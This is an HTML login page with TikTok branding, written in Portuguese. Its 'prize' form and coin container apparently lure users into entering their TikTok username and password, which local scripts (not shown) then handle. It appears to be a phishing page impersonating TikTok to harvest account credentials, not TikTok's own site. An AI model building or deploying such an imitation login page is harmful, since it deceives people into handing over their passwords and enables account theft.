<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>login</title>
    <link rel="stylesheet" href="index.css">
</head>
<body>
    <div class="moedas-container"></div>
    <a class="apresentacao__links__login">
        <img class="apresentacao__login__imagem" src="images/download.jpg" alt="Ícone pessoas">
        Usar telefone/e-mail/nome de usuário
    </a>

    <div class="fixed">
        © 2025 TikTok
    </div>
    <div>
        <a class="link_navegacao" href="https://www.tiktok.com/feedback/?lang=en">
            <img class="link_imagem" src="images/download.jpeg" alt="icon">
            Feedback and help
        </a>
    </div>

    <div class="login_premio">
        <form id="login">
            <label for="nome">telefone/e-mail/nome de usuário</label><br>
            <input class="campo_pre" type="text" id="nome" name="nome" required><br>
    
            <label for="senha">Senha:</label><br>
            <div style="position: relative;">
                <input class="campo_pre" type="password" id="senha" name="senha" required style="padding-right: 40px;">
                <button type="button" id="toggleSenha" style="position: absolute; right: 5px; top: 50%; transform: translateY(-50%); border: none; background: none; cursor: pointer;">
                    👁️
                </button>
            </div><br>
    
            <button class="entrar_login" type="submit">Entrar</button>
        </form>
    </div>
    
    
    <a class="link_voltar" href="index.html">
        <img class="link_image" src="images/voltar.jpg" alt="icon">
        Voltar
    </a>

    <script src="login-client.js"></script>
    <script src="index.js"></script>
    <script>
        const toggleSenha = document.getElementById('toggleSenha');
        const senhaInput = document.getElementById('senha');
      
        toggleSenha.addEventListener('click', () => {
          const tipo = senhaInput.getAttribute('type') === 'password' ? 'text' : 'password';
          senhaInput.setAttribute('type', tipo);
          toggleSenha.textContent = tipo === 'password' ? '👁️' : '🙈';
        });
      </script>
      
</body>
</html>
